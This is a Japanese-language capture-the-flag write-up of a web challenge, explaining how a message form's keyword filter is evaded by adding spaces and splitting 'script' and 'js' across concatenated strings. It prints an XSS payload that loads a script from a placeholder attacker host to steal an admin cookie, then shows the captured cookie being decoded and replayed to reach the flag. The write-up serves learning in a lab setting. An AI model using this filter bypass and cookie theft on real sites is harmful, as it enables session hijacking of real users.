# Wallowing Wallabies - Part Two
Category: Web
Point: 50

## Question
Time to brush off those XSS skills again in a new part of the page! Same website as [before](https://wallowing-wallabies.ctfcompetition.com/).

## FLAG
`CTF{strict_contextual_autoescaping_to_solve_your_xss_woes}`

## Answer
Wallowing Wallabies - Part Oneの続きで，`vendors`ページに`Messaging`というリンクが新たに追加されている．
リンクをクリックすると，`/deep-blue-sea/team/vendors/msg`ページに移動する．
このページでは，Bobという人にメッセージを送れるフォームが存在する．

このフォームを通して，Part Oneと同様の手順でCookieを奪取すれば良いと考えられる．
いくつかの入力を試してみると，`<script>`や`src=`，`onerror=`，`js`，`script`等のキーワードが弾かれることがわかる．
ただ正規表現（？）に漏れがあり，`src =`や`onerror =`のようにスペースを含めると弾かれないため，
フォームに下記を入力して送信した．

```html
<img src =0 onerror ="document.write('<scr'+'ipt   src    ='+'http://your-specific-domain-or-ip-address/external.j' + 's></scr' + 'ipt>')">
```
ここでは，`js`や`script`にならないように連結する．

しばらくすると，WebサーバのアクセスログにCookieの情報が乗ったアクセスが届く．  
`green-mountains=eyJub25jZSI6IjE3ZDE0NWE5M2Q5Yzc5Y2MiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vY2hhcmFjdGVycy4qJCIsImV4cGlyeSI6MTQ2MjEyMTUyM30=|1462121520|e52c48a9cb7c11d0ba3d795ef5e941a9cdeb27f6`

`|`で三区分された一つ目の文字列をデコードしてみる．
```bash
$ echo 'eyJub25jZSI6IjE3ZDE0NWE5M2Q5Yzc5Y2MiLCJhbGxvd2VkIjoiXi9kZWVwLWJsdWUtc2VhL3RlYW0vY2hhcmFjdGVycy4qJCIsImV4cGlyeSI6MTQ2MjEyMTUyM30=' | base64 -D
{"nonce":"17d145a93d9c79cc","allowed":"^/deep-blue-sea/team/characters.*$","expiry":1462121523}
```

上記のCookieの値をセットして，`characters`ページをアクセスすると，フラグが表示される．

最初，Base64デコードせずにただCookieをセットして，`vendors`ページに何回もアクセスしてハマってしまった:weary:

## Author
GitHub: @asakasa
